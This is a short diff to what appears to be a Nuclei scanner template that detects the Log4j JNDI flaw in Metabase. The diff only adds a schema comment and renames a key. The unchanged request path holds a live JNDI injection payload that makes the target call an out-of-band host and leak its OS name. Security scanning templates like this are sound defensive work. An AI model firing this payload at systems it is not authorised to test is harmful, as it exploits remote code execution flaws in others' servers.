@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: metabase-log4j
 
 info:
@@ -14,7 +15,7 @@ info:
     shodan-query: title:"Metabase"
   tags: cve,cve2021,rce,jndi,log4j,metabase
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}"
